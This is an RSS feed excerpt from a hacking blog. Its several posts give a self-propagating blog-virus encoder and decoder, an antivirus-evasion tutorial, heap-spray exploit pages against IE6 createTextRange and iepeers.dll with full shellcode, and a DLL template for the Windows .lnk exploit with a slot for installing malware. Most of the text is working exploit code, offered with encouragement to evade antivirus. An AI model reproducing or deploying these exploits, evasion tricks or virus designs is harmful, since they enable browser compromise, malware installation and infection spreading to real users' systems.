x=escape(x);<br />
var s=&quot;&quot;,r=&quot;&quot;;<br />
for(var i=0;i&lt;x.length;i++) {<br />
s=x.charAt(i);<br />
if(s==&quot;%&quot;) {<br />
s=&quot;Q&quot;;<br />
}else if(s==&quot;i&quot;){s=&quot;Z&quot;}else if(s==&quot;a&quot;){s=&quot;J&quot;;}else if(s==&quot;t&quot;)<br />
{s=&quot;F&quot;;}<br />
else{s=x.charAt(i);}<br />
r+=s;<br />
}return r; }<br />
<br />
The decoder:<br />
function y(x) {<br />
var s=&quot;&quot;,r=&quot;&quot;;<br />
for(var i=0;i&lt;x.length;i++) { s=x.charAt(i);<br />
if(s==&quot;Q&quot;){<br />
s=&quot;%&quot;;<br />
}else if(s==&quot;Z&quot;){s=&quot;i&quot;;}else if(s==&quot;J&quot;){s=&quot;a&quot;;}else<br />
if(s==&quot;F&quot;){s=&quot;t&quot;;}<br />
else{s=x.charAt(i);}<br />
r+=s;<br />
}r=unescape(r);return r;<br />
}<br />
I just replaced&quot;%&quot; with &quot;Q&quot;, &quot;i&quot; with &quot;Z&quot;, &quot;a&quot; with &quot;J&quot;, and &quot;t&quot; with &quot;F&quot;.<br />
<br />
I've used the encoder only once in this case. And the virus code contained the scrambled code and a decoder and and eval(). The decoder code was also inside the scramble and while infecting it should also<br />
place the unscrambled decoder and eval() function in the body of virus. Once the code executed it will infect other blogs with decoder and eval attached at the end of the scrambled code. But the decoder has a problem in this case. Once it will go under scrambling, following code will be interchanged as shown below:<br />
s=&quot;i&quot; to s=&quot;Z&quot; making if(s==&quot;Z&quot;){s=&quot;i&quot;;} to if(s==&quot;Z&quot;){s=&quot;Z&quot;;}<br />
Similarly for other charecters. And the decoder will fail to decode properly. So i interchanged the charecters with their hex equivalents and the decoder code was changed as shown below:<br />
function y(x) {<br />
var s=&quot;&quot;,r=&quot;&quot;;<br />
for(var i=0;i&lt;x.length;i++) {<br />
s=x.charAt(i);<br />
if(s==&quot;\x51&quot;) {<br />
s=&quot;\x25&quot;;<br />
}else if(s==&quot;\x5A&quot;) {<br />
s=&quot;\x69&quot;;<br />
}else if(s==&quot;\x4A&quot;) {<br />
s=&quot;\x61&quot;;<br />
}else if(s==&quot;\x46&quot;) {<br />
s=&quot;\x74&quot;;<br />
}else {<br />
s=x.charAt(i);<br />
}r+=s;<br />
}<br />
r=unescape(r);return r;<br />
}</blockquote>

]]></content:encoded>
			<dc:creator>prashant_uniyal</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=27</guid>
		</item>
		<item>
			<title><![CDATA[Evading AV Signatures..Derailing the Antivirus--"vinnu"]]></title>
			<link>http://garage4hackers.com/entry.php?b=18</link>
			<pubDate>Tue, 10 Aug 2010 14:14:57 GMT</pubDate>
			<description><![CDATA[Evading AV Signatures..Derailing the Antivirus 
 
Author: "vinnu" 
Greetz : Prashant Uniyal, b0nd, Lord Deathstorm, D4rk357, G4H 
Team : Legion Of...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Evading AV Signatures..Derailing the Antivirus<br />
<br />
Author: &quot;vinnu&quot;<br />
Greetz : Prashant Uniyal, b0nd, Lord Deathstorm, D4rk357, G4H<br />
Team : Legion Of Xtremers (LOX).<br />
<br />
<br />
The perimeter defence (antivirus) is still considered fullproof measure by most of people<br />
in virtual world. Such an assumption is fatal and can lead to more sophisticated compromise<br />
of systems.<br />
<br />
Note: In my last paper, &quot;Heap spray -- Slipping CPU To Our Pocket&quot; I used some example exploits,<br />
and most of people said that these things are getting caught in antivirus. But I already said<br />
that do some R&amp;D and you can develop the neat and clean exploits. So in this paper, I will use<br />
same examples.<br />
<br />
<br />
Some of the strategies of antivirus and ways to envade them are discussed in this paper.<br />
<br />
Strategy: <br />
<br />
1. Hostile code will try to execute itself as-fast-as it can: Bad-bad strategy.<br />
<br />
Interesting strategy, as most of the viral code try to execute and infect as-fast-as<br />
it can when it grabs the execution. Such a strategy can be evaded using sleeps, timeouts or dalays.<br />
<br />
2. code size, as-small-as-possible: This strategy leads to assumption that a viral code, might employ<br />
smallest possible variable, function names etc. and will lack spaces and tabs.<br />
Again u can evade such an assumption easily by introducing spaces, tabs an breaking longer strings.<br />
<br />
Shellcode or any data or string can be disected into several smaller chunks.<br />
For examples:<br />
<br />
var shellcode=unescape('%u9090%u9090%u9090%u9090%uceba  %u11fa%u291f%ub1c9%udb33%ud9ce%u2474%u5ef4%u5631%u  030e%u0e56%u0883%uf3fe%u68ea%u7a17%u9014%u1de8%u75  9c%u0fd9%ufefa%u8048%u5288%u6b61%u46dc%u19f2%u69c9  %u94b3%u442f%u1944%u0af0%u3b86%u508c%u9bdb%u9bad%u  dd2e%uc1ea%u8fc1%u8ea3%u2070%ud2c7%u4148%u5907%u39  f0%u9d22%uf385%ucd2d%u8f36%uf566%ud73d%u0456%u0b91  %u4faa%uf89e%u4e58%u3176%u61a0%u9eb6%u4e9f%ude3b%u  68d8%u95a4%u8b12%uae59%uf6e0%u3b85%u50f5%u9b4d%u61  dd%u7a82%u6d95%u086f%u71f1%udd6e%u8d89%ue0fb%u045d  %uc6bf%u4d79%u661b%u2bdb%u97ca%u933b%u3db3%u3137%u  44a7%u5f1a%uc436%u2620%ud638%u082a%ue751%uc7a1%uf8  26%uac63%u1ac9%ud8a6%u8361%u6123%u34ec%ua59e%ub709  %u552b%ua7ee%u5059%u6faa%u28b1%u05a3%u9fb5%u0fc4%u  7ed6%ud357%ue537%u76df%u4148')<br />
<br />
can Also be transformed into:<br />
<br />
<br />
var missindia = unescape(/*hi how are you*/'%u9090%u9'/*oh something, somewhere is losing*/+ '090%u90' +'90%u9090%uc' + /*jaijeya! ji*/'eba%u'+ '11fa%'+ 'u291f%ub1c9%ud' +' b33%ud9ce%' +' u2474%' +' u5ef4%u56'+ '31%u030e%u' + '0e56%u0883%uf3' + 'fe%u68ea%u7' +<br />
'a17%u9014%u'/* but who is the one who is losing*/ + &quot;1de8%u759c%u0&quot; + 'fd9%ufefa%' /*again dont ask me*/+ 'u8048%u5288%u'+ '6b61%u46dc%u19f2%u6' +'9c9%u94b3%u442f%'+ 'u1944%u0af0%u'+ '3b86%u508c'+ '%u9bdb%u9bad%udd'+ '2e%uc1ea%u8fc' +<br />
&quot;1%u8ea3%u2070%&quot;+ &quot;ud2c7%u4148%u59&quot;+ '07%u39f0%u9d22%uf' + '385%ucd2d%u8f'+ &quot;36%uf566%ud73d%u0456%u&quot;+ '0b91%u4faa%uf89e%u4'+ 'e58%u3176%u61a'+ '0%u9eb6%u4e9f%ude3'+ 'b%u68d8%u95a4%u8b1'+ '2%uae59%uf6e0%u3b85'+<br />
'%u50f5%u9b4d%u61'+ 'dd%u7a82%u6d9'+ '5%u086f%u71f1%udd'+ '6e%u8d89%' + 'ue0fb%u045d%uc' + '6bf%u4d79%u661b%u2b'+ 'db%u97ca%u933b%u3db3%u313' +'7%u44a7%u5f1a%uc4'+ &quot;36%u2620%ud638%&quot; + 'u082a%ue751%uc7a1%u' +<br />
&quot;f826%uac63%u1ac9%&quot; + &quot;ud8a6%u8361%u61&quot; + '23%u34ec%ua59e%ub709'+ '%u552b%ua7ee%u5059%u'+ 6faa%u28b1%u05a3%'+ 'u9fb5%u0fc4%u'+ '7ed6%ud357%ue5'+ '37%u76df%u4148');<br />
<br />
<br />
<br />
3. Long lasting Loops: essence of exploits: Again bad, bad strategy.<br />
<br />
Loops can eat up resources like CPU and task schedular manager whenever sights the presence of any loop, it allocates more CPU time slice to the host process.<br />
This is easiest signature for getting caught. Like this one in heap spray article.<br />
<br />
<br />
for(i=0;i&lt;1000;i++){spray[i]=nopsled+shellcode;}<br />
<br />
<br />
This can be broken into smaller loops like:<br />
<br />
for(i=0;i&lt;100;i++){spray[i]=nopsled+shellcode;}<br />
<br />
for(i=100;i&lt;200;i++){spray[i]=nopsled+shellcode;}<br />
<br />
---<br />
---<br />
---<br />
<br />
for(i=950;i&lt;1000;i++){spray[i] = nopsled + shellcode; }<br />
<br />
<br />
But why should you use the loop, if you can do without it like:<br />
<br />
var i = 0;<br />
spray[i] = nopsled + shellcode;i++<br />
spray[i] = nopsled + shellcode;i++<br />
spray[i] = nopsled + shellcode;i++<br />
spray[i] = nopsled + shellcode;i++<br />
<br />
------<br />
----<br />
thousand lines of such code.<br />
<br />
Otherwise:<br />
<br />
spray[0] = nopsled + shellcode;<br />
spray[1] = nopsled + shellcode;<br />
spray[2] = nopsled + shellcode;<br />
spray[3] = nopsled + shellcode;<br />
---<br />
---<br />
---<br />
spray[999] = nopsled + shellcode;<br />
<br />
<br />
The best practice will be:<br />
<br />
<br />
<br />
function somefunc() {<br />
var somevar = document.cookie;<br />
}<br />
var vhold;<br />
spray[0] = nopsled + shellcode;<br />
vhold = setTimeout(&quot;somefunc()&quot;,50);<br />
spray[1] = nopsled + shellcode;<br />
<br />
------<br />
------<br />
<br />
and like that.<br />
<br />
4. Followup code signature:  This kind of strategy makes antivirus believe that an exploit<br />
will always execute a certain fixed instruction. again bad-bad strategy.<br />
<br />
E.g. most antivirus will detect following vulnerability:<br />
<br />
<br />
<br />
&lt;!---------------------&gt;<br />
&lt;input type=&quot;checkbox&quot; id='checkid'&gt;<br />
&lt;script type=text/javascript language=javascript&gt;<br />
a=document.getElementById('checkid');<br />
b=a.createTextRange();<br />
&lt;/script&gt;<br />
&lt;!---------------------&gt;<br />
<br />
<br />
<br />
But, if we'll insert some junk code into it, then same antivirus, will not detect it as a<br />
threat as in following code:<br />
<br />
<br />
<br />
&lt;!---------------------&gt;<br />
&lt;input type=&quot;checkbox&quot; id='checkid'&gt;<br />
&lt;script type=text/javascript language=javascript&gt;<br />
function doit() {<br />
var asdragger = document.cookie + &quot;hi all&quot;;<br />
}<br />
a=document.getElementById('checkid');<br />
var grabit = setTimeout(&quot;doit()&quot;,1000);<br />
var memc = navigator.appVersion;<br />
b=a.createTextRange();<br />
&lt;/script&gt;<br />
&lt;!---------------------&gt;<br />
<br />
<br />
Employing all these techniques, u can also develop a code scrambler and after employing all these techniques<br />
and further scrambling the The antivirus envasion is possible.<br />
<br />
<br />
There exists more techniques, which if employed including all above listed countermeasures, all the antivirus<br />
with even latest ever updates can also be evaded successfully. Just a little more research from urside is needed.<br />
<br />
Thanx...&quot;vinnu&quot;</blockquote>

]]></content:encoded>
			<dc:creator>prashant_uniyal</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=18</guid>
		</item>
		<item>
			<title>Heap Spray --- Slipping CPU to our pocket--continued</title>
			<link>http://garage4hackers.com/entry.php?b=17</link>
			<pubDate>Fri, 06 Aug 2010 13:41:20 GMT</pubDate>
			<description>Above exploit will take nearly a minute to spraY the heap. Also study the performance graph of memory and cpu in taskmanager for 
better...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Above exploit will take nearly a minute to spraY the heap. Also study the performance graph of memory and cpu in taskmanager for<br />
better understanding the heap spray technique.<br />
<br />
<br />
2. IE iepeers:<br />
<br />
The following code can trigger the vulnerability in ieepeers.dll in internet explorer:<br />
<br />
<br />
&lt;html&gt;&lt;body&gt;<br />
&lt;button id='butid' onclick='trigger();' style='display:none'&gt;&lt;/button&gt;<br />
<br />
&lt;!--place the sprayer here----&gt;<br />
<br />
spray=new Array();var i=0;<br />
for(i=0;i&lt;500;i++){spray[i]=nopsled+shellcode;}<br />
function trigger(){<br />
var varbdy = document.createElement('body');<br />
varbdy.addBehavior('#default#userData');<br />
document.appendChild(varbdy);<br />
try {<br />
for (iter=0; iter&lt;10; iter++) {<br />
varbdy.setAttribute('s',window);<br />
}<br />
} catch(e){ }<br />
window.status+='';<br />
}<br />
document.getElementById('butid').onclick();<br />
&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<br />
<br />
<br />
<br />
So for above vulnerability, following is the heap spray exploit with calc.exe shellcode:<br />
<br />
&lt;!----------------------iepeers.htm------------------&gt;<br />
&lt;html&gt;&lt;body&gt;<br />
&lt;button id='butid' onclick='trigger();' style='display:none'&gt;&lt;/button&gt;<br />
&lt;script language='javascript'&gt;<br />
/*----------heap sprayer------------------*/<br />
var shellcode=unescape('%u9090%u9090%u9090%u9090%uceba  %u11fa%u291f%ub1c9%udb33%ud9ce%u2474%u5ef4%u5631%u  030e%u0e56%u0883%uf3fe%u68ea%u7a17%u9014%u1de8%u75  9c%u0fd9%ufefa%u8048%u5288%u6b61%u46dc%u19f2%u69c9  %u94b3%u442f%u1944%u0af0%u3b86%u508c%u9bdb%u9bad%u  dd2e%uc1ea%u8fc1%u8ea3%u2070%ud2c7%u4148%u5907%u39  f0%u9d22%uf385%ucd2d%u8f36%uf566%ud73d%u0456%u0b91  %u4faa%uf89e%u4e58%u3176%u61a0%u9eb6%u4e9f%ude3b%u  68d8%u95a4%u8b12%uae59%uf6e0%u3b85%u50f5%u9b4d%u61  dd%u7a82%u6d95%u086f%u71f1%udd6e%u8d89%ue0fb%u045d  %uc6bf%u4d79%u661b%u2bdb%u97ca%u933b%u3db3%u3137%u  44a7%u5f1a%uc436%u2620%ud638%u082a%ue751%uc7a1%uf8  26%uac63%u1ac9%ud8a6%u8361%u6123%u34ec%ua59e%ub709  %u552b%ua7ee%u5059%u6faa%u28b1%u05a3%u9fb5%u0fc4%u  7ed6%ud357%ue537%u76df%u4148');<br />
bigblock=unescape(&quot;%u0D0D%u0D0D&quot;);<br />
headersize=20;shellcodesize=headersize+shellcode.l  ength;<br />
while(bigblock.length&lt;shellcodesize){bigblock+=big  block;}<br />
heapshell=bigblock.substring(0,shellcodesize);<br />
nopsled=bigblock.substring(0,bigblock.length-shellcodesize);<br />
while(nopsled.length+shellcodesize&lt;0x25000){nopsle  d=nopsled+nopsled+heapshell}<br />
<br />
spray=new Array();var i=0;<br />
for(i=0;i&lt;500;i++){spray[i]=nopsled+shellcode;}<br />
/*--------------spray code end---------------------*/<br />
<br />
function trigger(){<br />
var varbdy = document.createElement('body');<br />
varbdy.addBehavior('#default#userData');<br />
document.appendChild(varbdy);<br />
try {<br />
for (iter=0; iter&lt;10; iter++) {<br />
varbdy.setAttribute('s',window);<br />
}<br />
} catch(e){ }<br />
window.status+='';<br />
}<br />
document.getElementById('butid').onclick();<br />
&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<br />
&lt;!----------------------iepeers.htm------------------&gt;<br />
<br />
<br />
The spray area for iepeers exploit for IE6 is small and thus exploit runtime is efficiently faster.<br />
<br />
<br />
The story doesnt end here, study more for more expertisation over code execution and heap spray technique...&quot;vinnu&quot;</blockquote>

]]></content:encoded>
			<dc:creator>prashant_uniyal</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=17</guid>
		</item>
		<item>
			<title><![CDATA[Heap Spray --- Slipping CPU to our pocket--by "vinnu"]]></title>
			<link>http://garage4hackers.com/entry.php?b=16</link>
			<pubDate>Fri, 06 Aug 2010 13:40:48 GMT</pubDate>
			<description><![CDATA[Heap Spray --- Slipping CPU to our pocket 
 
Author : "vinnu" 
Team : "Legion Of Xtremers" (LOXians) 
Greetz : Prashant Uniyal, b0nd, D4rk357,...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Heap Spray --- Slipping CPU to our pocket<br />
<br />
Author : &quot;vinnu&quot;<br />
Team : &quot;Legion Of Xtremers&quot; (LOXians)<br />
Greetz : Prashant Uniyal, b0nd, D4rk357, skylined<br />
<br />
Rootkit Information:<br />
<br />
IDE: any text editor<br />
Language : Javascript<br />
Targets: Web browsers<br />
<br />
<br />
As the name defines itself Heap Spray technique uses the spraying of heap memory<br />
with injection vector.<br />
Injection Vector: Nop sled + Shellcode<br />
<br />
This kind of exploitation is useful in use-after-free, double-free or memory corruption<br />
vulnerabilities. In such attacks the program tries to access an object instance's methods or poroperties in heap<br />
memory after the instance has been freed, this may lead to the code execution.<br />
<br />
A typical execution flow of a general heap spray exploit is as:<br />
<br />
<br />
-------------------------<br />
Allocate the object<br />
&amp; properties if necessary<br />
-------------------------<br />
|<br />
|<br />
|<br />
_I_<br />
-------------------------<br />
Free the object<br />
-------------------------<br />
|<br />
|<br />
|<br />
_I_<br />
------------------------<br />
Spray the heap<br />
------------------------<br />
|<br />
|<br />
|<br />
_I_<br />
-------------------------<br />
Trigger the vulnerability<br />
-------------------------<br />
<br />
<br />
<br />
And in general we can seperate the heap spray exploits in two sections:<br />
<br />
1. Heap Sprayer<br />
2. Vulnerability Trigger<br />
<br />
<br />
1. Heap Sprayer : A heap sprayer sprays the heap with the properly alligned code to be executed<br />
upon triggering the vulnerability. In heap spray the memory is repeatedly allocated in the heap area<br />
and then injection vector is placed in it untill whole heap gets filled up.<br />
<br />
The ammount of spray depends upon the available memory for the program and the guessed position of the<br />
block of memory in which the vulnerable instance of object gets placed in general.<br />
<br />
In order to develop some efficient sprayers, we must know a little about the fundamentals of allocations.<br />
<br />
When an object gets allocated in heap?<br />
<br />
Consider following two allocation:<br />
<br />
var a = &quot;XXXXXXXXXXXXXXXXXXXXXxxxxx&quot;<br />
var b = new String(&quot;YYYYYYYYYYYYYYYY&quot;)<br />
<br />
<br />
Well variable &quot;a&quot; will be allocated on stack whereas b will be allocated on heap.<br />
<br />
also consider following assignments:<br />
<br />
<br />
var c = a + a;<br />
var d = a.substring(0,a.length-3);<br />
<br />
<br />
c and d Will also be allocated in heap area.<br />
<br />
Also take into note that whan a heap allocation occurs, the largest unused block gets deallocated first and then<br />
the smaller chunk is allocated there. This also gives control of the heap allocations and its alignment to the attacker.<br />
<br />
Now we should know a little about the data placement in heap area.<br />
<br />
Consider a string &quot;AAAA&quot;, it will be placed in memory as unicode string in following form:<br />
<br />
00 41 00 41 00 41 00 41 00 00<br />
<br />
<br />
This kind of data handling can destroy the shellcode in memory. therefore, shellcode should be placed in memory<br />
in unicode form occupying 00 bytes also with precious shellcode bytes.<br />
<br />
For examples consider 90 90 90 90 bytes to be placed in memory as nop sled. Then this nop sled can be allocated as:<br />
<br />
var nopsled = unescape(&quot;\u9090\u9090&quot;);<br />
<br />
Sameway the shellcode can be placed in memory.<br />
<br />
So now we have basic idea of code allocation. Now let us proceed to develop a sprayer:<br />
<br />
The heap spray is done in two stages.<br />
<br />
First a very large instance of injection vector is prepared &amp; allocated on heap area<br />
and then it is sprayed all over heap to fill up all available memory for heap allocations.<br />
<br />
<br />
Note: After a perfect heap spray, no further heap allocations can be done.<br />
<br />
<br />
<br />
<br />
var shellcode = unescape('&lt;place Shellcode here&gt;'); // shellcode is assigned.<br />
bigblock = unescape(&quot;%u0D0D%u0D0D&quot;); // nop sled<br />
headersize=20;shellcodesize = headersize + shellcode.length; //Proper length of shellcode in memory is calculated.<br />
while(bigblock.length &lt; shellcodesize) {<br />
bigblock += bigblock; // The nopsled of a little big size than shellcode size is first prepared.<br />
}<br />
heapshell = bigblock.substring(0, shellcodesize); // Nopsled of proper calculated shellcode length on heap is allocated.<br />
nopsled = bigblock.substring(0, bigblock.length - shellcodesize); // another chunk of nopsled - propershellcode size in memory is allocated on heap<br />
while(nopsled.length + shellcodesize &lt; 0x40000){ // Filling up 40000 words (word = 2bytes) for modern browsers. Lets name this line as &quot;single chunk&quot;.<br />
nopsled = nopsled + nopsled + heapshell; // A large single chunk at heap is being populated.<br />
}<br />
<br />
<br />
Above code properly adjusts the nop sled 0x0d0d0d0d and shellcode.<br />
Now this large heap chunk contained in variable &quot;nopsled&quot; needs to be sprayed throughout the<br />
heap along with shellcode suffixed to it as:<br />
<br />
<br />
spray=new Array();var i=0;<br />
for(i=0;i&lt;1000;i++) {<br />
spray[i]=nopsled+shellcode; // Nopsled + shellcode being sprayed throughout the heap area.<br />
}<br />
<br />
<br />
<br />
Above code will spray 1000 time the heap enough to bring down a 512 MB physical memory windows XP systems in modern<br />
web browsers IE7 onwards.<br />
<br />
In case of IE6 and below, u may need to adjust the &quot;single chunk&quot; size and spray size accordingly.<br />
<br />
For examples in case of IE 6 single chunk can be made 86000 whereas spray size can be set to 200 or 400 as per vulnerabilities requirements.<br />
<br />
Now we have an efficient heap sprayer:<br />
<br />
&lt;----------------------heap sprayer------------------------&gt;<br />
var shellcode=unescape('&lt;place Shellcode here&gt;');<br />
bigblock=unescape(&quot;%u0D0D%u0D0D&quot;);<br />
headersize=20;shellcodesize=headersize+shellcode.l  ength;<br />
while(bigblock.length&lt;shellcodesize){bigblock+=big  block;}<br />
heapshell=bigblock.substring(0,shellcodesize);<br />
nopsled=bigblock.substring(0,bigblock.length-shellcodesize);<br />
while(nopsled.length+shellcodesize&lt;0x40000){nopsle  d=nopsled+nopsled+heapshell}<br />
<br />
spray=new Array();var i=0;<br />
for(i=0;i&lt;1000;i++){spray[i]=nopsled+shellcode;}<br />
&lt;--------------------heap sprayer end----------------------&gt;<br />
<br />
<br />
<br />
<br />
Now let us consider few real world vulnerabilities and develop the exploits with above heap sprayer.<br />
<br />
<br />
1. IE 6 textranges(): The vulnerability lies in createTextRange() function associated with checkbox objects in html.<br />
<br />
<br />
&lt;html&gt;<br />
&lt;body&gt;<br />
&lt;input type=&quot;checkbox&quot; id='checkid'&gt;<br />
&lt;script type=text/javascript language=javascript&gt;<br />
a=document.getElementById('checkid');<br />
b=a.createTextRange();<br />
&lt;/script&gt;<br />
&lt;/body&gt;<br />
&lt;/html&gt;<br />
<br />
<br />
<br />
<br />
In order to exploit such a vulnerability, we just need to spray the heap right before triggering the vulnerability.<br />
after hit and trials and adjustments of &quot;single chunk&quot; size and spray size, we got an efficient exploit :<br />
<br />
<br />
&lt;!----------------------textranges.htm----------------&gt;<br />
&lt;html&gt;<br />
&lt;body&gt;<br />
&lt;script language=javascript&gt;<br />
/*----------------------heap sprayer------------------------*/<br />
var shellcode=unescape('&lt;place Shellcode here&gt;');<br />
bigblock=unescape(&quot;%u0D0D%u0D0D&quot;);<br />
headersize=20;shellcodesize=headersize+shellcode.l  ength;<br />
while(bigblock.length&lt;shellcodesize){bigblock+=big  block;}<br />
heapshell=bigblock.substring(0,shellcodesize);<br />
nopsled=bigblock.substring(0,bigblock.length-shellcodesize);<br />
while(nopsled.length+shellcodesize&lt;0x82000){nopsle  d=nopsled+nopsled+heapshell}<br />
<br />
spray=new Array();var i=0;<br />
for(i=0;i&lt;400;i++){spray[i]=nopsled+shellcode;}<br />
/*--------------------heap sprayer end----------------------*/<br />
&lt;/script&gt;<br />
&lt;input type=&quot;checkbox&quot; id='checkid'&gt;<br />
&lt;script type=text/javascript language=javascript&gt;<br />
a=document.getElementById('checkid');<br />
b=a.createTextRange();<br />
&lt;/script&gt;<br />
&lt;/body&gt;<br />
&lt;/html&gt;<br />
&lt;!--------------------textranges.htm end--------------&gt;<br />
<br />
<br />
<br />
with calc.exe execution shellcode<br />
<br />
<br />
&lt;!----------------------textranges.htm----------------&gt;<br />
&lt;html&gt;<br />
&lt;body&gt;<br />
&lt;script language=javascript&gt;<br />
/*----------------------heap sprayer------------------------*/<br />
var shellcode=unescape('%u9090%u9090%u9090%u9090%uceba  %u11fa%u291f%ub1c9%udb33%ud9ce%u2474%u5ef4%u5631%u  030e%u0e56%u0883%uf3fe%u68ea%u7a17%u9014%u1de8%u75  9c%u0fd9%ufefa%u8048%u5288%u6b61%u46dc%u19f2%u69c9  %u94b3%u442f%u1944%u0af0%u3b86%u508c%u9bdb%u9bad%u  dd2e%uc1ea%u8fc1%u8ea3%u2070%ud2c7%u4148%u5907%u39  f0%u9d22%uf385%ucd2d%u8f36%uf566%ud73d%u0456%u0b91  %u4faa%uf89e%u4e58%u3176%u61a0%u9eb6%u4e9f%ude3b%u  68d8%u95a4%u8b12%uae59%uf6e0%u3b85%u50f5%u9b4d%u61  dd%u7a82%u6d95%u086f%u71f1%udd6e%u8d89%ue0fb%u045d  %uc6bf%u4d79%u661b%u2bdb%u97ca%u933b%u3db3%u3137%u  44a7%u5f1a%uc436%u2620%ud638%u082a%ue751%uc7a1%uf8  26%uac63%u1ac9%ud8a6%u8361%u6123%u34ec%ua59e%ub709  %u552b%ua7ee%u5059%u6faa%u28b1%u05a3%u9fb5%u0fc4%u  7ed6%ud357%ue537%u76df%u4148');<br />
bigblock=unescape(&quot;%u0D0D%u0D0D&quot;);<br />
headersize=20;shellcodesize=headersize+shellcode.l  ength;<br />
while(bigblock.length&lt;shellcodesize){bigblock+=big  block;}<br />
heapshell=bigblock.substring(0,shellcodesize);<br />
nopsled=bigblock.substring(0,bigblock.length-shellcodesize);<br />
while(nopsled.length+shellcodesize&lt;0x86000){nopsle  d=nopsled+nopsled+heapshell}<br />
<br />
spray=new Array();var i=0;<br />
for(i=0;i&lt;800;i++){spray[i]=nopsled+shellcode;}<br />
/*--------------------heap sprayer end----------------------*/<br />
&lt;/script&gt;<br />
&lt;input type=&quot;checkbox&quot; id='checkid'&gt;<br />
&lt;script type=text/javascript language=javascript&gt;<br />
a=document.getElementById('checkid');<br />
b=a.createTextRange();<br />
&lt;/script&gt;<br />
&lt;/body&gt;<br />
&lt;/html&gt;<br />
&lt;!--------------------textranges.htm end--------------&gt;</blockquote>

]]></content:encoded>
			<dc:creator>prashant_uniyal</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=16</guid>
		</item>
		<item>
			<title><![CDATA[Windows Link exploit (shortcut file) race condition tackling--"vinnu"]]></title>
			<link>http://garage4hackers.com/entry.php?b=14</link>
			<pubDate>Tue, 03 Aug 2010 11:16:08 GMT</pubDate>
			<description><![CDATA[Team : Legion Of Xtremers / Garage4Hackers 
author : "vinnu" 
Greetz : Prashant Uniyal, b0nd, D4rk457, and Secfence team. 
Exploit path :...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Team : Legion Of Xtremers / Garage4Hackers<br />
author : &quot;vinnu&quot;<br />
Greetz : Prashant Uniyal, b0nd, D4rk457, and Secfence team.<br />
Exploit path : <a href="http://www.exploit-db.com/exploits/14403/" target="_blank">http://www.exploit-db.com/exploits/14403/</a><br />
Exploit by : Ivanlef0u<br />
<br />
<br />
Windows Link exploit (shortcut file) race condition tackling<br />
<br />
The .lnk exploit retrieves a DLL from remote machine and execute it while the icon<br />
for the shortcut (.lnk file) is resolved.<br />
<br />
The race condition:<br />
The .lnk exploitation suffers from a race condition as it executes the downloaded dll 3 times<br />
simultaneously. This hinders the proper exploitation of the victim in case the payload dll<br />
tries to write any file on the disk or tries to access and change any other resource on the victim<br />
system.<br />
First thing to be noted that the .lnk exploit is actually an undocumented DLL-Injection<br />
technique.<br />
The .lnk file will retrieve a file of type either .dll, .cpl or .ocx or extension which are<br />
legitimate dynamic libraries with DllMain() defined.<br />
<br />
The race condition need to be resolved in this retrieved DLL.<br />
In this example, we are going to download and execute the x.dll.<br />
The example sample DLL code is (suppose 'x' is the project name):<br />
<br />
/* ------------x.cpp--------------------*/<br />
#include &lt;iostream&gt;<br />
#include &lt;shellapi.h&gt;<br />
<br />
#pragma data_seg(&quot;.xdat&quot;) // Shared memory section to tackle race condition<br />
bool xcheck = false;<br />
#pragma data_seg()<br />
<br />
void x() {<br />
// The exploit worked, now install malware<br />
// Place all mallware installation code here.<br />
// The code to access the resources<br />
// like file creation etc...<br />
}<br />
void in() { // This routine will handle the race condition<br />
if (xcheck == false) { // If false then set it true and access the resources<br />
xcheck = true;x(); // otherwise just exit the routine.<br />
}<br />
}<br />
BOOL APIENTRY DllMain( HANDLE hModule,<br />
DWORD ul_reason_for_call,<br />
LPVOID lpReserved<br />
)<br />
{<br />
switch (ul_reason_for_call)<br />
{<br />
case DLL_PROCESS_ATTACH:<br />
in();break;<br />
case DLL_THREAD_ATTACH:<br />
case DLL_THREAD_DETACH:<br />
case DLL_PROCESS_DETACH:<br />
break;<br />
}<br />
return TRUE;<br />
}<br />
/*----------end of file-----------------*/<br />
<br />
Also a x.DEF file is needed and must be added to the project workspace.<br />
This file will define the custom memory sections attributes:<br />
<br />
SECTIONS<br />
.xdat READ WRITE SHARED<br />
<br />
There exists more ways to tackle race condition like the use of mutexes, semaphores etc.<br />
The same exploit can aslo be made cross browser and can also be launched via internet.<br />
<br />
But try a little it urself. I'll tell u later....&quot;vinnu&quot;<br />
<b><br />
[Study the exploit to know more the above discussion. The link has been provided above.]</b></blockquote>

]]></content:encoded>
			<dc:creator>prashant_uniyal</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=14</guid>
		</item>
	</channel>
</rss>
